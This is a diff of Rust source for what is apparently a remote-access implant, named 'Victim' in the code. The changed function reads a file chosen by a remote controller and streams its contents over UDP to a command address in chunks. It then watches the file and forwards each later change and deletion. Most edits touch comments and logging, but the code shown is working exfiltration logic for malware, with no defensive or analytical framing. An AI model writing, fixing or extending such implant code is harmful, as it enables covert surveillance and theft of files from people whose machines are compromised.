@@ -479,7 +479,7 @@ impl Victim {
     }
 
     fn handle_file_watch_start(&mut self, payload: &[u8], udp: &UdpSocket, 
-                               cmd_addr: SocketAddr) -> io::Result<()> {
+        cmd_addr: SocketAddr) -> io::Result<()> {
         if payload.is_empty() { return Ok(()); }
         
         let path_len = payload[0] as usize;
@@ -488,7 +488,7 @@ impl Victim {
         let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
         println!("[*] Starting file watch on: {}", file_path);
         
-        // Send initial file content using PACKET_TYPE_FILE (reuse existing mechanism)
+        // Send initial file content using PACKET_TYPE_FILE
         if let Ok(data) = std::fs::read(&file_path) {
             const CHUNK_SIZE: usize = 1024;
             for chunk in data.chunks(CHUNK_SIZE) {
@@ -498,10 +498,11 @@ impl Victim {
             self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;
         }
         
-        // Start background watcher using notify ONLY (no polling)
+        // Start background watcher
         let (tx, rx) = notify_channel();
         let (stop_tx, stop_rx) = mpsc::channel::<()>();
         
+        // FIX: Convert notify::Error to io::Error
         let mut watcher = RecommendedWatcher::new(tx, Config::default())
             .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
         
@@ -512,6 +513,7 @@ impl Victim {
         self.file_watch_path = Some(file_path.clone());
         self.file_watch_stop_tx = Some(stop_tx);
         
+        // FIX: Clone cmd_addr before moving into thread
         let file_path_clone = file_path.clone();
         let udp_clone = udp.try_clone()?;
         
@@ -523,7 +525,7 @@ impl Victim {
                     break;
                 }
                 
-                // Handle notify events with timeout
+                // Handle notify events
                 match rx.recv_timeout(Duration::from_millis(500)) {
                     Ok(Ok(event)) => {
                         match event.kind {
@@ -531,8 +533,10 @@ impl Victim {
                                 thread::sleep(Duration::from_millis(200));
                                 
                                 if let Ok(data) = std::fs::read(&file_path_clone) {
-                                    // Send using PACKET_TYPE_FILE_WATCH with proper header
-                                    // Payload is PURE file data - NO markers!
+                                    println!("[*] File changed, sending {} bytes", data.len());
+                                    
+                                    // FIX: Use PACKET_TYPE_FILE_WATCH with proper header
+                                    // Payload is PURE file data - NO 0x73 marker!
                                     const CHUNK_SIZE: usize = 1024;
                                     for chunk in data.chunks(CHUNK_SIZE) {
                                         let header = PacketHeader::new_file_watch(FILE_WATCH_UPDATE, chunk.len() as u32);
@@ -541,16 +545,15 @@ impl Victim {
                                         packet.extend_from_slice(chunk);
                                         let _ = udp_clone.send_to(&packet, cmd_addr);
                                     }
-                                    // Empty packet signals end of update
+                                    // Empty packet signals end of update - NO 0xFF marker!
                                     let header = PacketHeader::new_file_watch(FILE_WATCH_UPDATE, 0);
                                     let mut packet = vec![0u8; HEADER_SIZE];
                                     packet.copy_from_slice(&header.to_bytes());
                                     let _ = udp_clone.send_to(&packet, cmd_addr);
-                                    println!("[*] File change sent: {} bytes", data.len());
                                 }
                             }
                             EventKind::Remove(_) => {
-                                // Send delete using PACKET_TYPE_FILE_WATCH
+                                // FIX: Use PACKET_TYPE_FILE_WATCH with DELETE subtype
                                 let header = PacketHeader::new_file_watch(FILE_WATCH_DELETE, 0);
                                 let mut packet = vec![0u8; HEADER_SIZE];
                                 packet.copy_from_slice(&header.to_bytes());
